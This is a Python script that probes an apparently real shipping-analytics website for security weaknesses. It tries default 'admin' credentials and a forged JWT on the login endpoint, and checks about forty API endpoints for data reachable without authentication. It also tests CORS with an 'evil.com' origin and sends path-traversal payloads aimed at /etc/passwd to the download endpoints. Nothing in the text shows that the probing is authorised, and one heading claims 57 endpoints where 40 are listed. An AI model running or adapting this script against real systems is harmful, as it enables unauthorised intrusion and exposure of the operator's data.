import urllib.request
import ssl
import json

ctx = ssl.create_default_context()
base = 'https://reliability.cargosmart.com'

def api_test(path, data=None, method='POST', headers=None):
    url = base + path
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64)')
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if data and isinstance(data, bytes):
        if not headers or 'Content-Type' not in {k.lower(): v for k, v in (headers or {}).items()}:
            req.add_header('Content-Type', 'application/json')
    try:
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        body = resp.read()
        return (resp.status, body, dict(resp.headers))
    except urllib.error.HTTPError as e:
        body = e.read() if e.fp else b''
        return (e.code, body, dict(e.headers))
    except Exception as e:
        return (None, str(e).encode(), {})

print('=== 1. Test /api/login with Token in Authorization Header ===')
# Try various token formats
for token in ['admin', 'test123', 'Bearer admin', 'eyJhbGciOiJIUzI1NiJ9.e30.ZRrHA1JJJW8opsbCGfG_HACGpVUMN_a9IV7pAx_Zmeo']:
    result = api_test('/api/login',
                      data=json.dumps({'username': 'admin', 'password': 'admin'}).encode(),
                      method='POST',
                      headers={'Authorization': token})
    status, body, _ = result
    try:
        j = json.loads(body)
        print(f'  Authorization: {token[:30]}... -> HTTP {status}')
        print(f'    Response: {json.dumps(j, indent=2, ensure_ascii=False)[:300]}')
    except:
        print(f'  Authorization: {token[:30]}... -> HTTP {status}, Body: {body.decode()[:100]}')

print('\n=== 2. Test /api/login with Empty Body ===')
result = api_test('/api/login', data=json.dumps({}).encode(), method='POST')
status, body, _ = result
print(f'  Empty body: HTTP {status}')
print(f'  Response: {body.decode()[:300]}')

print('\n=== 3. Test /api/login with No Body ===')
result = api_test('/api/login', method='POST', headers={})
status, body, _ = result
print(f'  No body: HTTP {status}')
print(f'  Response: {body.decode()[:300]}')

print('\n=== 4. Test ALL 57 Endpoints for 200 responses (without auth) ===')
endpoints = [
    '/api/carrier-view/all/trade/service',
    '/api/carrier-view/rawdata/pp',
    '/api/carrier-view/rawdata/sp',
    '/api/carrier-view/trade',
    '/api/carrier-view/trade/simulate',
    '/api/crr-group/delete-carrier',
    '/api/crr-group/insert-carrier',
    '/api/crr-group/update-carrier',
    '/api/cv-email/add-data',
    '/api/cv-email/check-status',
    '/api/cv-email/delete-data',
    '/api/cv-email/send-email',
    '/api/cv-email/update-data',
    '/api/get-sp-ata-trade-reliability',
    '/api/huawei/base/search-all-raw',
    '/api/huawei/base/search-all-report',
    '/api/huawei/check-status/',
    '/api/huawei/perf/carrier',
    '/api/huawei/perf/carrier/group/city',
    '/api/huawei/perf/carrier/group/region',
    '/api/huawei/perf/get-month',
    '/api/huawei/perf/log/download',
    '/api/huawei/perf/service',
    '/api/huawei/perf/service/group/city',
    '/api/huawei/perf/service/group/region',
    '/api/login',
    '/api/port-raw-data/get-all',
    '/api/pp-reliability/get-all',
    '/api/raw-data/supplement/input',
    '/api/raw-data/supplement/upload',
    '/api/rawdata/download/port-pair',
    '/api/rawdata/download/single-port',
    '/api/rawdata/download/weekly/port-pair',
    '/api/rawdata/download/weekly/port-reliability',
    '/api/rawdata/download/weekly/single-port',
    '/api/reliability/carrier-alliance',
    '/api/reliability/departure/port',
    '/api/reliability/log/monthly/report',
    '/api/reliability/log/weekly/report',
    '/api/reliability/round-trade',
]

accessible = []
for ep in endpoints:
    result = api_test(ep, data=json.dumps({}).encode(), method='POST')
    status, body, headers = result
    if status == 200:
        try:
            j = json.loads(body)
            accessible.append((ep, j))
            print(f'  *** ACCESSIBLE: {ep} (HTTP {status})')
            print(f'      {json.dumps(j, ensure_ascii=False)[:200]}')
        except:
            accessible.append((ep, body.decode()[:100]))
            print(f'  *** ACCESSIBLE: {ep} (HTTP {status})')
            print(f'      {body.decode()[:100]}')

print(f'\n=== Total accessible endpoints: {len(accessible)} ===')
if accessible:
    print('Summary:')
    for ep, data in accessible:
        print(f'  {ep}')
        if isinstance(data, dict):
            print(f'    Keys: {list(data.keys())[:10]}')

print('\n=== 5. Test with Different HTTP Methods on /api/login ===')
for method in ['GET', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']:
    result = api_test('/api/login', method=method)
    status, body, _ = result
    print(f'  {method} /api/login: HTTP {status}')
    if body:
        try:
            j = json.loads(body)
            print(f'    Response: {json.dumps(j, ensure_ascii=False)[:200]}')
        except:
            print(f'    Body: {body.decode()[:100]}')

print('\n=== 6. Test CORS Headers ===')
result = api_test('/api/login', method='OPTIONS',
                  headers={'Origin': 'https://evil.com', 'Access-Control-Request-Method': 'POST'})
status, body, headers = result
print(f'  OPTIONS /api/login: HTTP {status}')
print(f'  CORS Headers:')
for k, v in headers.items():
    if 'access-control' in k.lower() or 'allow' in k.lower():
        print(f'    {k}: {v}')

print('\n=== 7. Test Path Traversal in Download Endpoints ===')
for dl_ep in ['/api/rawdata/download/port-pair', '/api/rawdata/download/single-port']:
    # Try various path traversal payloads
    for payload in ['../etc/passwd', '..%2f..%2f..%2fetc%2fpasswd', '....//....//....//etc/passwd']:
        result = api_test(f'{dl_ep}?file={payload}', method='GET')
        if result[0] not in [401, 404]:
            print(f'  {dl_ep}?file={payload}: HTTP {result[0]}')
